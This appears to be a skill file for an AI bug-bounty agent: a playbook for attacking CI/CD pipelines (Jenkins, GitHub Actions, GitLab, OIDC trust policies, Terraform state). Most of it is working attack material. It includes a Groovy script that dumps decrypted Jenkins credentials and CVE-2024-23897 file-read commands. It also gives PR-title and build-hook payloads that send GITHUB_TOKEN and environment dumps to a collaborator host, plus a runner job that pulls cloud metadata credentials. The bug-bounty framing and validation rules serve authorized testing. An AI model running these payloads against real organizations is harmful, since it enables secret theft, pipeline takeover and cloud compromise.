---
name: hunt-cicd
description: "Hunt CI/CD pipeline vulnerabilities — GitHub Actions workflow injection (pull_request_target Pwnrequest + ${{ }}-into-shell), GITHUB_ENV/GITHUB_PATH newline injection, self-hosted runner poisoning, OIDC trust-policy abuse (AWS/GCP/Azure), Jenkins script-console RCE and CVE-2024-23897 file read, GitLab CI runner-token registration, Terraform state file leakage, artifact/log secret leakage, pipeline env-var disclosure. Use when target has a public GitHub/GitLab org, exposed CI dashboards (Jenkins/TeamCity/Drone/Argo/Azure Pipelines/CircleCI), or build artifacts/images are reachable."
sources: hackerone_public, github_security_lab, cve_database, portswigger_research
report_count: 18
---

# HUNT-CICD — CI/CD Pipeline Security

## Crown Jewel Targets

Jenkins `/script` console reachable = immediate RCE. A GitHub Actions `pull_request_target` (or `workflow_run`) workflow that checks out the **PR head ref** and references untrusted `${{ github.event.* }}` in a shell `run:` = "Pwnrequest" → secret exfil from a fork PR with zero approval.

**Highest-value findings:**
- **Jenkins Script Console** — Groovy execution → full RCE → dump the credential store
- **Jenkins CLI file read (CVE-2024-23897)** — pre-auth `@/etc/passwd` arg expansion → read `secret.key`/`credentials.xml` → forge admin → RCE
- **GitHub Actions `pull_request_target` injection (Pwnrequest)** — fork PR controls `${{ }}` inside a privileged shell step → exfil `GITHUB_TOKEN` (often `contents:write`) and org secrets
- **Self-hosted runner poisoning** — non-ephemeral runner on a public repo executes a fork PR's build → attacker code runs on the runner host → persistence + secret theft
- **OIDC trust-policy abuse** — over-broad `sub` claim wildcard in an AWS IAM role trust policy → any workflow in the org assumes a privileged cloud role
- **Terraform state leakage** — `*.tfstate` in public S3/GCS/Blob → plaintext infra creds, DB passwords, private keys
- **Runner token / artifact / log leakage** — register attacker runner, or harvest secrets printed before `::add-mask::`

---

## "It-Didn't-Happen-Without-Proof" Gate (Read First)

CI/CD findings are over-reported because dashboards *look* exploitable. Before claiming anything:

1. **A login page is not an RCE.** A reachable `/script` URL that returns a Jenkins login or `403` is **not** an unauthenticated script console. Only an actual `scriptText` POST returning your command's output counts.
2. **A `pull_request_target` workflow is not automatically injectable.** It is only exploitable if untrusted data flows into an execution sink. Confirm the data flow (see FP section) before you ever open a PR.
3. **Blind injection requires OOB.** If the vulnerable step has no output you can read, you MUST confirm via Burp Collaborator / interactsh — a unique per-sink subdomain that the runner calls out to. A workflow that "ran green" is not proof your code executed.
4. **A `.tfstate` HTTP 200 is not cred exposure until you parse it.** Diff against a baseline (see FP section) — many `tfstate` files contain only resource IDs and outputs, no secrets.

---

## Phase 1 — Jenkins: Detection, Script Console, CVE-2024-23897

```bash
# Fingerprint — the X-Jenkins header leaks the exact version (drives CVE selection)
curl -sI "https://$TARGET/" | grep -iE "x-jenkins|x-hudson"
curl -sI "https://$TARGET/login" | grep -i "x-jenkins-session"
for p in /script /jenkins/script /ci/script /scriptText /jenkins/scriptText; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$p")
  echo "$p -> $code"   # 200 on /script == anon script console; 403/401 == auth required (NOT a finding alone)
done
```

**Unauthenticated script console → RCE (only if the POST returns output):**
```bash
# This must return uid=...(jenkins). If it returns the Jenkins login HTML or a
# Crowd/SSO error page, the console is NOT anon-accessible — do not report it.
curl -s -X POST "https://$TARGET/scriptText" \
  --data-urlencode 'script=println "id".execute().text'
```

**Dump the credential store** (Groovy decrypts secrets the UI masks):
```groovy
import com.cloudbees.plugins.credentials.CredentialsProvider
import com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials
import org.jenkinsci.plugins.plaincredentials.StringCredentials
CredentialsProvider.lookupCredentials(StandardUsernamePasswordCredentials, jenkins.model.Jenkins.instance).each {
  println "${it.id} :: ${it.username} :: ${it.password.getPlainText()}"
}
CredentialsProvider.lookupCredentials(StringCredentials, jenkins.model.Jenkins.instance).each {
  println "${it.id} :: ${it.secret.getPlainText()}"
}
```

**CVE-2024-23897 — pre-auth arbitrary file read via Jenkins CLI** (args4j `@`-file expansion; affects ≤2.441 / LTS ≤2.426.2). With anonymous read, this escalates to RCE by reading `secret.key` + `master.key` to decrypt `credentials.xml`, or reading a user's `config.xml` API token:
```bash
# Download the matching jenkins-cli.jar from /jnlpJars/jenkins-cli.jar first.
java -jar jenkins-cli.jar -s "https://$TARGET/" -http connect-node "@/etc/passwd"
# The file content is echoed back in the error. Then target:
#   @/var/lib/jenkins/secret.key  @/var/lib/jenkins/secrets/master.key
#   @/var/lib/jenkins/credentials.xml
```
Validation: the response must contain real file content (root:x:0:0). A generic "no such agent" with no leaked line means the instance is patched or the path is wrong — not a finding.

---

## Phase 2 — GitHub Actions: Pwnrequest, `${{ }}`-into-Shell, Runner Poisoning, OIDC

### The core distinction (this is where 90% of false PoCs die)

There are **two** sink classes — they need different payloads:

- **`${{ }}` template expansion into a shell `run:`** — the expression is substituted into the script *before* the shell runs, so a newline/backtick/`$(...)` in the untrusted field becomes literal shell. This is the classic injection.
- **Environment variable read inside the shell** — `GITHUB_TOKEN`, `secrets.X`, and any `env:`-mapped value are **shell variables whose value IS the string**. To exfiltrate them you use `echo`/`printenv`, **never** `cat $VAR` (that tries to open a file *named* by the token and prints nothing).

```yaml
# VULNERABLE workflow (untrusted title flows into the script text):
on: pull_request_target            # runs with write token + secrets, on fork PRs
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with: { ref: ${{ github.event.pull_request.head.sha }} }   # checks out ATTACKER code
      - run: echo "Building PR ${{ github.event.pull_request.title }}"   # ← ${{ }} INJECTION
```

**Attack via the `${{ }}` sink** — set the PR **title** (or branch name, body, label, commit message — all attacker-controlled) to break out of the echo and run your own commands. Exfiltrate the token with `printenv`, not `cat`:
```
PR title:  a"; printenv GITHUB_TOKEN | base64 | tr -d '\n' | { read T; curl "https://x.<COLLAB>/?t=$T"; }; echo "
```
For a multi-line YAML `run:`, a newline injection is cleaner:
```
PR title:  foo\n      curl https://x.<COLLAB>/?d=$(printenv | base64 -w0)
```

**Attack via a poisoned checkout (no `${{ }}` needed)** — if `pull_request_target` checks out the PR head and then runs a build script / installs deps from the checked-out tree (`make`, `npm ci` with a malicious `preinstall`, a Makefile, a `.github/` action in the PR), the *runner executes attacker code directly*. Drop into any build hook:
```bash
# in attacker's PR, e.g. package.json preinstall or Makefile:
curl -s "https://x.<COLLAB>/?env=$(printenv | base64 -w0)"
cat /proc/self/environ | tr '\0' '\n' | base64 -w0   # captures secrets injected as env
```

**Self-hosted runner poisoning** — if `runs-on: self-hosted` (or a custom label) on a **public** repo with `pull_request`/`pull_request_target`, a fork PR's job runs on the org's own host. Non-ephemeral runners persist tools/creds between jobs. Confirm by reading the runner's identity and metadata from inside the job:
```bash
- run: |
    whoami; hostname; id
    curl -s "https://x.<COLLAB>/?h=$(hostname)&u=$(whoami)"
    curl -s "https://x.<COLLAB>/imds=$(curl -s --max-time 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64 -w0)"
```

**OIDC trust-policy abuse** — workflows that `configure-aws-credentials` via OIDC assume an IAM role. A trust policy whose `token.actions.githubusercontent.com:sub` condition is missing or uses a loose wildcard (`repo:ORG/*:*`) lets **any** workflow in the org (including a malicious one you can merge, or a fork on a misconfigured trigger) assume that role. Inspect the role:
```bash
aws iam get-role --role-name <RoleName> --query 'Role.AssumeRolePolicyDocument'
# Red flag: StringLike on sub with "repo:ORG/*" or no sub condition at all (only aud).
```
Then prove it: from a workflow you control in-org, assume the role and run `aws sts get-caller-identity` returning the privileged role ARN. Same class for GCP (`google-github-actions/auth` with `principalSet://.../attribute.repository/ORG/*`) and Azure federated credentials (`repo:ORG/*:ref:*`) — proof is `gcloud auth print-access-token` / `az account show` from that workflow, not the JSON trust document alone.

**`$GITHUB_ENV` / `$GITHUB_PATH` newline injection** (distinct from `${{ }}`-into-`run:`):

```yaml
# VULNERABLE: untrusted text becomes extra KEY=VALUE lines for later steps
- run: echo "TITLE=${{ github.event.issue.body }}" >> $GITHUB_ENV
# also: cat downloaded-artifact.txt >> $GITHUB_ENV
```

A body of `ok%0aLD_PRELOAD=/tmp/x.so` or `ok%0aNODE_OPTIONS=--require /tmp/x.js` executes in the **next** step. `env: TITLE: ${{ github.event.issue.body }}` then `echo "$TITLE"` stops *shell* injection and does **not** make a `$GITHUB_ENV` write safe. Proof: unique Collaborator hit from a later step of that job. One run.

**Token scope after exfil:** `curl -sI -H "Authorization: Bearer $T" https://api.github.com/repos/ORG/REPO` — report the actual permission (`contents:write` vs default `read`). A read-only token is credential exposure, not "push to default branch".

### Recon

```bash
# Enumerate org workflows that use the dangerous triggers
gh api graphql -f query='{organization(login:"ORG"){repositories(first:100){nodes{name}}}}' \
  | jq -r '.data.organization.repositories.nodes[].name' | while read r; do
  for wf in $(gh api "repos/ORG/$r/contents/.github/workflows" 2>/dev/null | jq -r '.[]?.name'); do
    body=$(gh api "repos/ORG/$r/contents/.github/workflows/$wf" 2>/dev/null | jq -r '.content' | base64 -d)
    echo "$body" | grep -Eq 'pull_request_target|workflow_run' && \
      echo "$body" | grep -Eq '\$\{\{ *github\.event|self-hosted|head\.ref|head\.sha' && \
      echo "CANDIDATE: ORG/$r/$wf"
  done
done
```
Triage candidates with the static analyzer before opening any PR: `gh extension install rhysd/actionlint` or run **zizmor** (`pip install zizmor; zizmor .github/workflows/`) which flags template-injection and dangerous-checkout patterns specifically.

---

## Phase 3 — Secrets in Logs & Artifacts

```bash
# Public-repo run logs frequently contain secrets printed BEFORE ::add-mask:: took effect,
# or echoed via debug. The masker only hides exact known values — derived/base64 forms slip through.
gh api "repos/ORG/REPO/actions/runs" | jq -r '.workflow_runs[:20][].id' | while read id; do
  gh api "repos/ORG/REPO/actions/runs/$id/logs" > /tmp/r.zip 2>/dev/null && \
  unzip -o -q /tmp/r.zip -d /tmp/runlogs && \
  grep -rniE 'AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|-----BEGIN|eyJ[A-Za-z0-9_-]{10,}\.' /tmp/runlogs
done

# Artifacts — env dumps, .env, kubeconfig, built binaries with embedded secrets
gh api "repos/ORG/REPO/actions/artifacts" | jq -r '.artifacts[] | "\(.id) \(.name)"'
```
Note `actions/upload-artifact` does **not** redact secrets — an artifact named `env`/`debug` is a common direct leak.

**Third-party action supply chain (2025 class).** Mutable tags (`uses: some/action@v3`) let the action's owner ship code into every privileged run. In March 2025 the `tj-actions/changed-files` compromise (CVE-2025-30066; reviewdog `action-setup` CVE-2025-30154 was hit in the same campaign) re-pointed version tags at a malicious commit that dumped runner memory — i.e. CI secrets — into the workflow logs of public repos. Two hunting moves: (1) grep the org's `uses:` lines for tag-pinned (non-SHA) actions inside `pull_request_target` / privileged workflows — report the exposure class precisely, not "supply-chain RCE"; (2) if the org ran a known-compromised action during its window, grep that window's public run logs (loop above) for the dumped secrets — a live secret recovered from those logs is the finding.

---

## Phase 4 — GitLab CI

```bash
# Runner registration token → register an attacker runner that picks up jobs (and their secrets).
# Found in config.toml (via LFI/disclosure), screenshots, /admin/runners, or leaked CI logs.
curl -s "https://$TARGET/api/v4/projects/PID/variables" -H "PRIVATE-TOKEN: $TOK"   # masked? protected?
curl -s "https://$TARGET/api/v4/runners?type=instance_type" -H "PRIVATE-TOKEN: $TOK"

# .gitlab-ci.yml review: unmasked variables, `CI_JOB_TOKEN` over-permission,
# `rules:` that run privileged jobs on MRs from forks (the GitLab analogue of pull_request_target).
curl -s "https://$TARGET/api/v4/projects/PID/repository/files/.gitlab-ci.yml/raw?ref=main"
```
GitLab 16+ runners authenticate with a `glrt-` token (or a project/group runner creation token). A legacy registration token still matters on older instances. Either string is a finding only if you register **one** ephemeral runner you own, it receives a real job, and you then unregister it. A token that never picks up a job is not impact.

---

## Phase 5 — Terraform State Leakage

```bash
# Probe common public-bucket/path patterns (parameterize $T and $ORG)
for U in \
  "https://$ORG.s3.amazonaws.com/terraform.tfstate" \
  "https://s3.amazonaws.com/$ORG-tfstate/terraform.tfstate" \
  "https://$ORG-infra.s3.amazonaws.com/env/prod/terraform.tfstate" \
  "https://storage.googleapis.com/$ORG-tfstate/default.tfstate" \
  "https://$ORG.blob.core.windows.net/tfstate/terraform.tfstate" ; do
  code=$(curl -s -o /tmp/tf.json -w "%{http_code}" "$U")
  [ "$code" = "200" ] && echo "[+] 200 $U" && \
    jq -r '.resources[].instances[].attributes
           | to_entries[] | select(.key|test("password|secret|private_key|token|access_key";"i"))
           | "\(.key) = \(.value)"' /tmp/tf.json 2>/dev/null
done
# Also hunt state in repos / backend configs
gh search code --owner ORG "terraform.tfstate" --limit 10
gh search code --owner ORG 'backend "s3"' --limit 10
```
**False-positive filter:** a `tfstate` that lists only `id`, `arn`, `tags` is not a secret leak. Run the `jq` above and confirm at least one *live* credential (a real `password`, `private_key`, RDS master password, or non-rotated access key). Then prove impact by using that credential read-only (`aws sts get-caller-identity`, a DB connect that returns a banner) — do not just claim "creds in state."

---

## Phase 6 — Build Artifact / Image Analysis

```bash
docker pull ORG/IMAGE:latest
docker history --no-trunc ORG/IMAGE:latest | grep -iE 'ENV|ARG|secret|token|password|key'
# Layer-level scan catches secrets removed in a later layer but still present in history:
trufflehog docker --image ORG/IMAGE:latest --only-verified
```
`--only-verified` filters trufflehog to credentials it could actually authenticate — use it to drop the noise of expired/example keys before reporting.

---

## Grounded References (named cases / CVEs)

- **Pwnrequest / `pull_request_target` class** — GitHub Security Lab (Jaroslav Lobačevski), "Keeping your GitHub Actions and workflows secure: Untrusted input." The original write-up of fork-PR secret exfil and the dangerous-checkout pattern.
- **GitHub Actions workflow-command injection — CVE-2020-15228** — `set-env`/`add-path` workflow commands allowed env/PATH injection from logged output; this drove the deprecation of those commands and the move to `$GITHUB_ENV`.
- **Jenkins CLI arbitrary file read — CVE-2024-23897** — args4j `@`-prefixed file expansion (Jenkins ≤2.441 / LTS ≤2.426.2), read `secret.key`/`credentials.xml` → admin → RCE.
- **Jenkins Stapler RCE — CVE-2018-1000861** — dynamic routing reaches `groovy.lang.GroovyShell`; a staple of the unauth script-execution chain on older Jenkins.
- **PortSwigger / Liam Galvin & others** — research on GitHub Actions injection sinks (title/branch/body/label) and the `${{ }}`-into-`run` template-substitution vector; the basis of the actionlint/zizmor detection rules cited above.

(Only CVEs and cases I can attribute exactly are listed. Confirm the running version against the CVE's affected range before claiming it.)

---

## Also on the same pipeline

**TeamCity (CVE-2024-27198 / CVE-2024-27199), versions before 2023.11.4.** Read-only check — a random path plus the `jsp` matrix parameter reaches an authenticated REST route. Patched servers return 403.

```bash
curl -sk "https://$TARGET/justcheck?jsp=/app/rest/server;.jsp"
# 200 + server XML = auth bypass. Stop.
# CVE-2024-27199 sibling: GET /res/../admin/diagnostic.jsp — info leak, read once.
```

Do not `POST` a new admin user or token unless the program allows a write. If it does: one user, prove one authenticated read, stop. Do not upload a plugin.

**GitHub Actions, beyond `pull_request_target` title injection** (Phase 2 still applies):

- `issue_comment`, `issues`, `workflow_dispatch`, and `workflow_run` bodies are attacker-controlled when those events fire from users who can open issues or run a dispatch. Same rule: `${{ github.event.* }}` inside `run:` is shell; the `env:` then `"$VAR"` form is not.
- `toJSON(github)` inside `run:` expands the whole event payload into the script.
- **Not only shell.** `actions/github-script` interpolates `${{ }}` into JavaScript (`script: | const t = "${{ github.event.issue.title }}"`). A title of `";require('child_process').execSync('curl https://x.<COLLAB>/?t='+process.env.GITHUB_TOKEN)//` is JS injection. `workflow_call` inputs dropped into `run:` (or written to `$GITHUB_ENV`) are the same class. `secrets: inherit` on a public reusable workflow is not a finding until an inherited secret hits your OOB from the *caller's* job.
- **Cache poisoning:** a fork `pull_request` job writes `actions/cache` under a key a privileged workflow (`pull_request_target`, default-branch `push`) restores. Proof is your marker file printed by the privileged job or an OOB hit from that job — not a reverse shell. One cache entry.
- **Untrusted artifact into a privileged job.** `workflow_run` / `pull_request_target` that `download-artifact`s the triggering run and then runs, `source`s, or deserializes a file from it executes in the privileged context. Proof: your marker in the fork artifact calls the collaborator **from the privileged job** (that job's token scope). One artifact.
- **Token left in an artifact (ArtiPACKED).** `actions/checkout` writes `x-access-token` / `ghs_` into `.git/config`. A later `upload-artifact` of the workspace publishes it. Download once, and the finding is a token that still answers `GET /user`. An expired `ghs_` is not.
- **OIDC `sub`:** a trust policy that allows `repo:ORG/REPO:pull_request` (or `repo:ORG/*`) lets a fork workflow assume the role. Proof is `aws sts get-caller-identity` from a workflow you control, in scope. Do not change cloud state.

**Azure Pipelines / CircleCI:** `$(Build.SourceBranch)` / `<< pipeline.git.branch >>` interpolated into a script step is the same template-into-shell class as `${{ }}`. One OOB from that job.

**Drone / Woodpecker / Argo CD dashboards** (only an in-scope host). `GET /api/user` or `GET /api/repos/<owner>/<repo>/secrets` with no token, or with a token already in a public config. A 401 is not a finding. Argo CD: one `GET /api/v1/applications` — a JSON app list without a login is the proof; a login page is not. Cookie CSRF against that API is `hunt-csrf`. Do not create an app or sync a malicious repo.

**GitLab:** `CI_JOB_TOKEN` that can read another in-scope project (token scope not limited) is IDOR of build secrets. Show one foreign variable or artifact. A registration token is a finding only if you register one ephemeral runner and it receives a real job (Phase 4).

## Chain Table

| CI/CD finding | Chain to | Impact |
|---|---|---|
| Jenkins anon script console | Dump credential store → cloud/DB creds → lateral | Critical |
| Jenkins CLI file read (CVE-2024-23897) | Read `secret.key`+`credentials.xml` → forge admin → RCE | Critical |
| Actions `${{ }}` / `$GITHUB_ENV` injection | `printenv GITHUB_TOKEN`/secrets → push to protected branch (only if token is write) | Critical |
| Self-hosted runner poisoning | Code-exec on runner host → IMDS creds → persistence | Critical |
| OIDC `sub` wildcard | `AssumeRole` privileged cloud role from any org workflow | Critical |
| Terraform state w/ live creds | Infra/DB/API credential use | Critical |
| GitLab runner registration | Register runner → capture pipeline secrets | High/Critical |
| Image/log/artifact secret | Direct credential use | High |

---

## Validation Discipline (per finding, before you report)

- **Jenkins console:** the `scriptText` POST returns your `id` output (`uid=…(jenkins)`). A returned login/SSO/Crowd page = **not** anon access. Screenshot the request+response.
- **CVE-2024-23897:** response contains real `/etc/passwd` content; confirm version is in range. Patched instances return an error with no leaked line.
- **Actions injection:** confirm the data flow into a sink first (FP section). Blind step → **Collaborator callback with the runner's source IP** is mandatory. Token exfil via `printenv`/`/proc/self/environ` decoded at your endpoint — never `cat $GITHUB_TOKEN`. Then prove **scope** (write vs read) before claiming branch protection bypass. `$GITHUB_ENV` injection is proven by an OOB from a *later* step, not by the write itself. `github-script` is the same bar in JavaScript. An artifact or cache bug is proven only when the **privileged** job (not the fork job) runs your marker or leaks a token that still authenticates.
- **OIDC abuse:** `aws sts get-caller-identity` / `gcloud auth print-access-token` / `az account show` from your controlled workflow returns the privileged identity — not just a permissive-looking trust policy.
- **Terraform state:** `jq` extraction yields ≥1 *live* secret, then a read-only auth proves it. ID/ARN-only state = no finding.
- **Runner token / image / logs:** demonstrate the secret authenticates (trufflehog `--only-verified`, or a real API call) — possession of a string is not impact.

### Common false positives to retract
- `/script` returning a login page (auth required) reported as "unauth RCE."
- `pull_request_target` present but untrusted input never reaches a sink (e.g., used only in `if:` on `github.actor`, or the workflow uses `pull_request` not `_target`).
- `${{ }}` reference that is already wrapped in an `env:` block and quoted in the shell (the recommended safe pattern) — not *shell*-injectable. Still a bug if that value is later appended to `$GITHUB_ENV` / `$GITHUB_PATH`.
- `.tfstate` 200 containing only resource metadata.
- A masked GitLab variable that is `protected` and only exposed to protected branches the attacker can't push to.
- Trufflehog "unverified" hits that are example/expired keys.

**Severity:** Jenkins console / CVE-2024-23897 / Actions secret exfil / runner poisoning / OIDC role assumption / Terraform live creds = **Critical**. Image/log/artifact secret = **High/Critical** by credential scope.

## Before you report — dedup gate

Fresh/changed surface first (see `dedup-novelty`, `changed-js-deepdive`), and hunt classes in yield
order (`/yield`). Before drafting ANY finding from this skill, run the dedup gate:

```bash
python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
```

`NOVEL` -> proceed to `/validate`. `LIKELY_DUP` -> stop unless you can prove a concrete differentiator
(different endpoint/param/impact, or a bypass of the deployed fix -> report as a regression).
